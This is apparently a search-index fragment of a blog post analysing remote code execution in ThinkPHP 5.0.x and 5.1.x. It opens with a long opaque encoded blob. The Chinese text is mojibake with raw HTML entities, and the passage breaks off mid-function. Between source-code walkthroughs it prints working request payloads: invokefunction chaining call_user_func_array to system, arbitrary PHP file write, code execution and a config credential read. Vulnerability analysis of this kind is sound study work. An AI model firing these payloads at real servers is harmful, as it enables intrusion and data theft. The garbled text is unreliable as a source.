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"},{"title":"thinkphp v5.x App.php så‚æ•°RCE","permalink":"http://blog.0kami.cn/2019/02/05/php-thinkphp-v5-x-App-php-rce/","text":"æ¦‚è¿°æ”¾å‡äº†ï¼Œå¯¹thinkphpçš„å‡ ä¸ªRCEåšä¸€ä¸‹åˆ†æï¼Œè®°å½•ä¸€ä¸‹XD thinkphp v5.0.xæ¼æ´ç›¸å…³ä¿¡æ¯æ¼æ´ç‰ˆæœ¬ï¼š&lt;= 5.0.22è¡¥ä¸ï¼šç‰ˆæœ¬æ›´æ–° Â· top-think/framework@4cbc0b5 Â· GitHubé—®é¢˜ç‚¹ï¼šlibrary/think/App.php æ¼æ´åˆ†æå…³äºthinkphpçš„urlè§£ææ–¹å¼THINKPHPæ”¯æŒä½¿ç”¨PATHINFOçš„æ–¹å¼æ¥è®¿é—®å…·ä½“çš„æ¨¡å—ã€ç±»ã€æ–¹æ³•ï¼Œå¦‚index.php/module/controller/actionå¯¹äºä¸æ”¯æŒPATHINFOçš„æœåŠ¡å™¨ï¼ŒTHINKPHPæä¾›äº†å…¼å®¹æ¨¡å¼?s=/module/controller/actionçš„æ–¹å¼æ¥è®¿é—®è€Œè¿™æ¬¡çš„æ¼æ´æˆå› å°±æ˜¯åœ¨äºå…¼å®¹æ¨¡å¼å¤„ç†æ—¶å­˜åœ¨çš„é—®é¢˜ã€‚é¦–å…ˆçœ‹ thinkphp/library/think/Request.phpçš„pathinfoå‡½æ•° 123456789101112131415161718public function pathinfo()&#123; if (is_null($this-&gt;pathinfo)) &#123; if (isset($_GET[Config::get('var_pathinfo')])) &#123; // åˆ¤æ–­URLé‡Œé¢æ˜¯å¦æœ‰å…¼å®¹æ¨¡å¼å‚æ•° $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')]; unset($_GET[Config::get('var_pathinfo')]); &#125; elseif (IS_CLI) &#123; // CLIæ¨¡å¼ä¸‹ index.php module/controller/action/params/... $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : ''; &#125; // åˆ†æPATHINFOä¿¡æ¯ ... $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/'); &#125; return $this-&gt;pathinfo;&#125; å½“GETè¯·æ±‚ä¸­å¸¦æœ‰så‚æ•°(configä¸­é»˜è®¤var_pathinfoä¸ºs)ï¼Œå°†pathinfoè®¾ç½®ä¸ºsçš„å‚æ•°å€¼æœ‰äº†pathinfoå€¼ï¼Œæˆ‘ä»¬å†æ‰¾åˆ°å…·ä½“çš„è§£æurlçš„å‡½æ•°ï¼Œthinkphp/library/think/Route.phpçš„parseUrlå‡½æ•°123456789101112public static function parseUrl($url, $depr = '/', $autoSearch = false)&#123; if (isset(self::$bind['module'])) &#123; $bind = str_replace('/', $depr, self::$bind['module']); // å¦‚æœæœ‰æ¨¡å—/æ§åˆ¶å™¨ç»‘å®š $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr); &#125; $url = str_replace($depr, '|', $url); list($path, $var) = self::parseUrlPath($url); $route = [null, null, null]; // ...&#125; å…¶ä¸­parseUrlå‡½æ•°çš„$urlä¸ºä¸Šé¢æ‹¿åˆ°çš„pathinfoï¼Œ$deprä¸ºé»˜è®¤çš„åˆ†å‰²ç¬¦é¦–å…ˆå¯¹$urlæ›¿æ¢åˆ†å‰²ç¬¦ä¸º|ï¼Œå†è¾“å…¥åˆ°parseUrlPathå‡½æ•°(æ ¹æ®/åˆ†å‰²)ï¼Œè¯¥å‡½æ•°å¯¹pathinfoè¿›è¡Œåˆ†å‰²ï¼Œäº§ç”Ÿmoduleã€controllerã€actioné‚£ä¹ˆç°åœ¨æ¥çœ‹rceçš„Poc?s=/index/\\think\\app/invokefunction=&gt;[module:index,controller:\\think\\app,action:invokefunction]å…¶ä¸­controller=&gt;\\think\\appï¼Œæ˜¯phpå‘½åç©ºé—´çš„è¡¨ç¤ºæ–¹å¼ï¼Œ\\think\\appå®é™…è°ƒç”¨library/think/App.phpï¼Œåé¢çš„actionå®é™…è°ƒç”¨çš„App.phpä¸­çš„invokefunctionå‡½æ•° æ¼æ´æˆå› ç‚¹ä¸Šé¢åˆ†æäº†thinkphpçš„å…¼å®¹æ¨¡å¼æ˜¯å¦‚ä½•å¤„ç†så‚æ•°çš„ï¼Œå¹¶ä¸”å¤„ç†å­˜åœ¨ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¯ä»¥ä¼ªé€ controllerï¼Œå¯¼è‡´å®é™…è°ƒç”¨ä¸ºå…¶ä»–çš„ç±»å’Œå‡½æ•°çœ‹ä¸€ä¸‹æ‹¿åˆ°moduleã€controllerã€actionåç³»ç»Ÿçš„å¤„ç†thinkphp/library/think/App.php çš„ moduleå‡½æ•°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public static function module($result, $config, $convert = null)&#123; if (is_string($result)) &#123; $result = explode('/', $result); &#125; $request = Request::instance(); ... // è®¾ç½®é»˜è®¤è¿‡æ»¤æœºåˆ¶ $request-&gt;filter($config['default_filter']); ... try &#123; $instance = Loader::controller(// å®ä¾‹åŒ–controllerç±» $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // è·å–å½“å‰æ“ä½œå $action = $actionName . $config['action_suffix']; $vars = []; if (is_callable([$instance, $action])) &#123; // æ‰§è¡Œæ“ä½œæ–¹æ³• $call = [$instance, $action]; // ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // ç©ºæ“ä½œ $call = [$instance, '_empty']; $vars = [$actionName]; &#125; else &#123; // æ“ä½œä¸å­˜åœ¨ throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; Hook::listen('action_begin', $call); return self::invokeMethod($call, $vars);// è°ƒç”¨å‡½æ•°&#125; æ‹¿åˆ°å®ä¾‹åŒ–åçš„å¯¹è±¡å’Œæ–¹æ³•ï¼ŒåŠ¨æ€è°ƒç”¨invokeMethod12345678910111213141516public static function invokeMethod($method, $vars = [])&#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \\ReflectionMethod($class, $method[1]); &#125; else &#123; // é™æ€æ–¹æ³• $reflect = new \\ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars);// è·å–å‚æ•°å†…å®¹ è¿™é‡Œè·å–åˆ°å‚æ•°ç”¨åšmethodçš„å‚æ•°è¾“å…¥ self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info'); return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);&#125; è¿™é‡Œä½¿ç”¨bindParamså‡½æ•°ä»getæˆ–postä¸­è·å–åˆ°å¯¹åº”çš„å†…å®¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåšå‚æ•°åµŒå…¥æ—¶ï¼Œéœ€è¦ä»¥å‡½æ•°çš„å‚æ•°åä¸ºé”®å¦‚invokeFunctionçš„å‚æ•°ä¸º$functionã€$varsï¼Œé‚£ä¹ˆåœ¨å‚æ•°ä¸­å°±éœ€è¦ä»¥function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxxå³pocçš„ååŠéƒ¨åˆ†function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-læ‰€ä»¥è°ƒç”¨é“¾ç°åœ¨å˜æˆäº† åŠ¨æ€è°ƒç”¨\\think\\app invokeFunctionå‡½æ•° æä¾›function=call_user_func_arrayä½œä¸ºinvokeFunctionåŠ¨æ€è°ƒç”¨çš„å‚æ•°ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥è°ƒç”¨call_user_func_arrayå‡½æ•° call_user_func_arrayçš„å‚æ•°ä¸ºsystemå‡½æ•°ï¼Œsystemå‡½æ•°çš„å‚æ•°ä¸ºls -lï¼Œæ‰€ä»¥è¿™é‡Œç”¨äº†2ç»´æ•°ç»„ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å‘æ•£ä¸€ä¸‹æ€ç»´ï¼Œæˆ‘ä»¬å…¶å®ä¸å•å•å¯ä»¥è°ƒç”¨\\think\\appè¿™ä¸ªç±»ï¼Œå¦‚æœå…¶ä»–çš„ç±»å¯ä»¥ä»»æ„è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œæˆ–è€…æ˜¯è°ƒç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ŒåŒæ ·å…·æœ‰å±å®³æ€§å¦‚ä»»æ„å‘½ä»¤æ‰§è¡Œ?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œç”Ÿæˆåœ¨index.phpåŒä¸€çº§ç›®å½•?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();è·å–é…ç½®ä¿¡æ¯?s=index/\\think\\config/get&amp;name=database.username thinkphp v5.1.xç‰ˆæœ¬ä¿¡æ¯ç‰ˆæœ¬ï¼š&lt;= v5.1.30è¡¥ä¸ä¿¡æ¯ï¼šä¿®æ­£æ§åˆ¶å™¨è°ƒç”¨ Â· top-think/framework@802f284 Â· GitHubæ¼æ´ç‚¹ï¼šthinkphp/library/think/route/dispatch/Module.php æ¼æ´åˆ†æåŸç†åŒv5.0.xç‰ˆæœ¬ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”±äºså‚æ•°å¸¦å…¥çš„è·¯å¾„è§£æå­˜åœ¨å®‰å…¨é—®é¢˜å¯¼è‡´çš„ä»»æ„ä»£ç æ‰§è¡Œå…ˆçœ‹App::run()1234567891011121314151617181920212223242526272829303132333435public function run()&#123; try &#123; // åˆå§‹åŒ–åº”ç”¨ $this-&gt;initialize(); ... $dispatch = $this-&gt;dispatch; if (empty($dispatch)) &#123; // è·¯ç”±æ£€æµ‹ $dispatch = $this-&gt;routeCheck()-&gt;init();// å¤„ç†moduleã€controllerã€action &#125; // è®°å½•å½“å‰è°ƒåº¦ä¿¡æ¯ $this-&gt;request-&gt;dispatch($dispatch); ... &#125; catch (HttpResponseException $exception) &#123; $dispatch = null; $data = $exception-&gt;getResponse(); &#125; $this-&gt;middleware-&gt;add(function (Request $request, $next) use ($dispatch, $data) &#123; return is_null($data) ? $dispatch-&gt;run() : $data; &#125;); $response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);// åŠ¨æ€è°ƒç”¨controllerã€action ... return $response;&#125; App::run()å‡½æ•°ä½“ç°äº†ç¨‹åºçš„ä¸€ä¸ªä¸»è¦æµç¨‹ï¼Œä»è·¯å¾„çš„è§£æåˆ°åŠ¨æ€è§£ææ‰§è¡Œç›¸åº”çš„æ§åˆ¶å™¨åŠæ–¹æ³•å…ˆæ¥çœ‹çœ‹ç¬¬13è¡Œï¼Œè·å–ç›¸åº”çš„è·¯å¾„ä¿¡æ¯thinkphp/library/think/App.php routeCheck()å‡½æ•°1234567891011121314151617181920public function routeCheck()&#123; // æ£€æµ‹è·¯ç”±ç¼“å­˜ ... // è·å–åº”ç”¨è°ƒåº¦ä¿¡æ¯ $path = $this-&gt;request-&gt;path(); // ä»Request.php pathæå–urlpath å…·ä½“ä»pathinfo()ï¼Œä¼˜å…ˆè·å–$_GET[$this-&gt;config['var_pathinfo']] // var_pathinfo é»˜è®¤ä¸ºs // æ˜¯å¦å¼ºåˆ¶è·¯ç”±æ¨¡å¼ $must = !is_null($this-&gt;routeMust) ? $this-&gt;routeMust : $this-&gt;route-&gt;config('url_route_must'); // è·¯ç”±æ£€æµ‹ è¿”å›ä¸€ä¸ªDispatchå¯¹è±¡ $dispatch = $this-&gt;route-&gt;check($path, $must);//è¿”å›UrlDispatchç±»å®ä¾‹ï¼Œä»dispatchç±»å¤„ç»§æ‰¿ ... return $dispatch;&#125; ç¬¬7è¡Œä»så‚æ•°ä¸­è·å–è·¯ç”±è·¯å¾„(sä¸ºvar_pathinfoçš„é»˜è®¤å€¼)ï¼Œåœ¨è°ƒç”¨routeCheckå‡½æ•°åè¿”å›ä¸€ä¸ªUrlDispatchï¼Œä¹‹åè°ƒç”¨äº†Urlç±»çš„initå‡½æ•°thinkphp/library/think/route/dispatch/Url.php init12345678public function init()&#123; // è§£æé»˜è®¤çš„URLè§„åˆ™ $result = $this-&gt;parseUrl($this-&gt;dispatch); // parseUrlå‡½æ•°å¤„ç†å‚æ•°å€¼(ä»¥/åˆ†å‰²ï¼Œä¼ å…¥|ä¹Ÿè¡Œä¼šè¢«æ›¿æ¢æˆ/ï¼Œæœ€ç»ˆç”±/æ¥åˆ†å‰²)ï¼Œè¿”å›[module,controller,action] return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();&#125; è¿”å›Moduleå¯¹è±¡ï¼Œç»§æ‰¿è‡ªDispatchå¯¹è±¡ï¼Œå¹¶ä¸”è°ƒç”¨äº†initå‡½æ•°ï¼Œå°†è§£æåçš„è·¯ç”±å¡«å……åˆ°dispatchï¼Œä¾›åé¢App::run()å‡½æ•°åŠ¨æ€è°ƒç”¨dispatchçš„runå‡½æ•°ï¼Œv5.1ç‰ˆæœ¬çš„è°ƒç”¨é“¾å¤æ‚äº†ä¸€ç‚¹ï¼Œä½†æ˜¯å…¶å®å†…å®¹åŒv5.0ç‰ˆæœ¬ç±»ä¼¼Dispatch::run()å‡½æ•°è°ƒç”¨äº†Module::exec()å‡½æ•°thinkphp/library/think/route/dispatch/Module.php exec()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public function exec()&#123; // ç›‘å¬module_init $this-&gt;app['hook']-&gt;listen('module_init'); try &#123; // å®ä¾‹åŒ–æ§åˆ¶å™¨ 